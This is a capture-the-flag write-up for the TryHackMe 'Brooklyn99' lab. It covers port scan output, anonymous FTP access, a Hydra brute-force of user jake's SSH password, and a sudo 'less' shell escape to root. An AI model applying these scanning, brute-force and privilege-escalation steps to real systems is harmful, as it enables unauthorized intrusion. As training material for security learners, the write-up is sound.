* * *
 ### Lab: Brooklyn99
 ### Platform: TryHackMe
* * *
![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/783caa35-2e5c-40a0-9315-5ed21cc68f68)

### Enumeration
- Rustscan's scan details

      ❯ rustscan -a 10.10.237.215 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      Real hackers hack time ⌛
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.237.215:21
      Open 10.10.237.215:22
      Open 10.10.237.215:80`
      PORT   STATE SERVICE REASON  VERSION
      21/tcp open  ftp     syn-ack vsftpd 3.0.3
      | ftp-anon: Anonymous FTP login allowed (FTP code 230)
      |_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
      | ftp-syst: 
      |   STAT: 
      | FTP server status:
      |      Connected to ::ffff:10.8.158.229
      |      Logged in as ftp
      |      TYPE: ASCII
      |      No session bandwidth limit
      |      Session timeout in seconds is 300
      |      Control connection is plain text
      |      Data connections will be plain text
      |      At session startup, client count was 2
      |      vsFTPd 3.0.3 - secure, fast, stable
      |_End of status
      22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
      |   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
      |   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
      80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
      | http-methods: 
      |_  Supported Methods: POST OPTIONS HEAD GET
      |_http-title: Site doesn't have a title (text/html).
      |_http-server-header: Apache/2.4.29 (Ubuntu)
      Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kerne
- The scan result reveals that the ftp service allows anonymous login.The directory contains a txt file stating that the `user: jake` has a weak password
 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d3907bb6-d7e0-4fcd-9c5a-3b3d01bbde3a)

- I bruteforced jake's password with Hydra

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d4ff07d4-0007-4313-9ed6-125e90d6de05)

- Ssh access

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8f50a8e4-8f82-4ac3-a493-87969336ba15)

### Privesc

- We can run the binary `/usr/bin/less` as root without password.We can use this binary to escalate privileges to root

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3950a583-58a1-4d5d-a260-cecf43e35751)

- I got this payload from gtfobins

      sudo less /etc/profile
      !/bin/sh

- Root access

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/63b0630e-8718-43a0-a46e-5fa865d2002f)
